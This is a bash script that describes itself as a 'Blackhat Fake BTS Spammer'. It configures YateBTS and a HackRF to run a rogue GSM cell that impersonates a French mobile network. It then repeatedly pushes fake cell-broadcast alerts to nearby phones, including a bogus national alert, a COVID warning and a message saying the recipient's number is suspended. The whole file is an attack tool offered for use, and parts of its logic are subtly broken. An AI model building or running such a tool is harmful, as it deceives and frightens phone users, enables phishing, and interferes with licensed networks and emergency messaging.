#!/bin/bash

# V4 - Fake GSM Cell Blackhat Edition Interactive
# trhacknonLAB

# Couleurs
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Messages Blackhat par défaut
DEFAULT_MESSAGES=(
    "MISE A JOUR RESEAU: Redemarrage obligatoire"
    "COVID-19 Alerte : Mesures urgentes"
    "5G Active : Nouvelle configuration requise"
    "MISE A JOUR SIM : Contactez votre opérateur"
    "ALERTE NATIONALE : Instructions à suivre"
    "MISE A JOUR SYSTEME : Redémarrage conseillé"
    "Maintenance Réseau : Perturbations possibles"
    "Votre numéro est suspendu, contactez assistance"
    "Nouveau réseau disponible : Sélection automatique"
)

# Bande et config BTS
BAND="900"
C0="62"
POWER="22"
MCC="208"
MNC="10"
SHORT_NAME="FREE_WIFI"
LONG_NAME="Public Access Point"

banner() {
    echo -e "${GREEN}"
    echo "██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗  ██╗ █████╗ ████████╗"
    echo "██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║ ██╔╝██╔══██╗╚══██╔══╝"
    echo "██████╔╝██║     ███████║██║     █████╔╝ █████╔╝ ███████║   ██║   "
    echo "██╔═══╝ ██║     ██╔══██║██║     ██╔═██╗ ██╔═██╗ ██╔══██║   ██║   "
    echo "██║     ███████╗██║  ██║╚██████╗██║  ██╗██║  ██╗██║  ██║   ██║   "
    echo "╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
    echo "Blackhat Fake BTS Spammer - trhacknon edition"
    echo -e "${RESET}"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Ce script doit être exécuté en root.${RESET}"
        exit 1
    fi
}

install_requirements() {
    echo -e "${GREEN}[+] Installation des paquets nécessaires...${RESET}"
    apt update
    apt install -y yate yate-bts yate-dev hackrf telnet dialog fzf
}

check_hackrf() {
    echo -e "${GREEN}[+] Vérification de HackRF...${RESET}"
    hackrf_info > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] HackRF non détecté.${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] HackRF détecté.${RESET}"
}

configure_ybts() {
    echo -e "${GREEN}[+] Configuration de la BTS...${RESET}"
    YBTS_CONF="/etc/yate/ybts.conf"

    cat > "$YBTS_CONF" << EOF
[ybts]
Radio.Band=$BAND
Radio.C0=$C0
Radio.Power=$POWER
Identity.MCC=$MCC
Identity.MNC=$MNC
Identity.ShortName=$SHORT_NAME
Identity.LongName=$LONG_NAME
EOF

    echo -e "${GREEN}[+] BTS configurée.${RESET}"
}

start_bts() {
    echo -e "${GREEN}[+] Démarrage de la BTS...${RESET}"
    pkill yate > /dev/null 2>&1
    sleep 1
    yate -s -C /etc/yate/ybts.conf &
    sleep 5
    echo -e "${GREEN}[+] BTS active.${RESET}"
}

send_cell_broadcast() {
    local message="$1"
    local channel="$2"
    (
    sleep 1
    echo "!broadcast text $channel \"$message\""
    sleep 1
    ) | telnet localhost 5038 > /dev/null 2>&1
}

select_message() {
    echo -e "${YELLOW}[+] Sélectionnez un message à envoyer...${RESET}"
    msg=$(echo "${DEFAULT_MESSAGES[@]}" | tr ' ' '\n' | fzf --prompt="Choisissez un message : " --height=10)
    if [ "$msg" == "Personnalisé" ]; then
        read -p "Entrez votre message personnalisé : " custom_message
        MESSAGES=("$custom_message")
    else
        MESSAGES=("$msg")
    fi
}

select_channel() {
    echo -e "${YELLOW}[+] Sélectionnez un canal...${RESET}"
    selected_channel=$(seq 50 55 | fzf --prompt="Choisissez un canal : " --height=10)
    echo -e "${GREEN}[+] Canal sélectionné : $selected_channel${RESET}"
    return $selected_channel
}

set_frequency() {
    echo -e "${YELLOW}[+] Définir la fréquence de spam...${RESET}"
    frequency=$(echo -e "5\n10\n20\n30\n60" | fzf --prompt="Choisissez une fréquence : " --height=10)
    if [[ ! "$frequency" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Fréquence invalide, utilisation de 10 secondes par défaut.${RESET}"
        frequency=10
    fi
}

blackhat_spam() {
    echo -e "${YELLOW}[+] Démarrage du spam BlackHat...${RESET}"
    while true; do
        for msg in "${MESSAGES[@]}"; do
            selected_channel=$(select_channel)
            send_cell_broadcast "$msg" "$selected_channel"
            sleep 1
            sleep $frequency
        done
    done
}

stop_bts() {
    echo -e "${RED}[!] Arrêt de la BTS...${RESET}"
    pkill yate > /dev/null 2>&1
    echo -e "${GREEN}[+] BTS arrêtée.${RESET}"
}

clear
banner
check_root
install_requirements
check_hackrf
configure_ybts
start_bts
select_message
set_frequency
blackhat_spam
trap stop_bts EXIT
